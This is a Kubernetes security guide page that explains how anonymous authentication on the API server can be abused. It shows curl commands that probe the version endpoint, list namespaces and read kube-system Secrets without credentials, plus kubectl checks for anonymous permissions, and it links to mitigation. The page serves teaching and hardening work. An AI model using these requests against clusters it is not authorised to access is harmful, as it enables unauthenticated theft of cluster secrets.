---
sidebar_position: 25
title: "Anonymous API Server Access Exploitation"
description: "How attackers exploit anonymous authentication enabled on the Kubernetes API server to access cluster resources without valid credentials."
keywords: [kubernetes anonymous access, api server unauthenticated, system:unauthenticated, kubernetes attack, CKS, anonymous auth exploit]
tags: [attack-vector, api-server, authentication, authorization, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/anonymous-api-access/
  - /kubernetes-security/attack-vectors/kubelet-anonymous-auth/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/compromised-api-server-mitigation/
---

# Anonymous API Server Access Exploitation

When anonymous authentication is enabled on the Kubernetes API server — which is the default configuration when any authorization mode other than `AlwaysAllow` is in use — unauthenticated requests are not rejected outright. Instead, they are assigned the username `system:anonymous` and the group `system:unauthenticated` and evaluated by the authorization layer. Any ClusterRoleBinding or RoleBinding that grants permissions to `system:unauthenticated` is therefore reachable without credentials.

Clusters with misconfigured or overly permissive RBAC policies may inadvertently expose resource listing, reading, or even write operations to anonymous callers. This can allow an external attacker with only network access to the API server to enumerate cluster topology, read configuration data, or trigger further exploitation steps.

---

## Exploitation Steps

An attacker with network access to the Kubernetes API server port (default: 6443) probes the cluster for anonymous access.

### 1. Discover API Server Endpoint

```bash
# Probe the API server version endpoint — accessible to anonymous by default
curl -sk https://203.0.113.10:6443/version
```

A successful response reveals the Kubernetes version and confirms the API server is reachable. This information is useful for targeting version-specific vulnerabilities.

### 2. Enumerate Accessible Resources

```bash
# Attempt to list namespaces as an unauthenticated user
curl -sk https://203.0.113.10:6443/api/v1/namespaces
```

If RBAC grants the `system:unauthenticated` group any permissions beyond the minimal health check endpoints, the server returns data instead of a 401 or 403 response.

### 3. Identify Overpermissive RBAC Bindings

An attacker or auditor can enumerate what the anonymous identity is authorized to do:

```bash
# Using kubectl from inside the cluster or with limited credentials
kubectl auth can-i list pods --as=system:anonymous -n default
kubectl auth can-i get secrets --as=system:anonymous -n kube-system
```

Any `yes` response indicates that anonymous access exposes that operation to unauthenticated callers.

### 4. Extract Sensitive Information

If anonymous users can read Secrets or ConfigMaps, the attacker retrieves credentials directly:

```bash
curl -sk https://203.0.113.10:6443/api/v1/namespaces/kube-system/secrets \
  -H "Accept: application/json"
```

---

### Result

The attacker gains read or write access to Kubernetes resources without presenting any credentials. **The blast radius depends entirely on what RBAC permissions have been granted to `system:unauthenticated`.** In clusters with overly broad bindings, this can lead to full cluster enumeration, secret theft, or workload manipulation.

---

## Mitigation

➡ [Restricting Anonymous API Server Access](/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/anonymous-api-access/)

---

## References

This article is based on information from the following official sources:

1. [Authentication — Anonymous Requests](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests) - Kubernetes Documentation
2. [Authorization Overview](https://kubernetes.io/docs/reference/access-authn-authz/authorization/) - Kubernetes Documentation
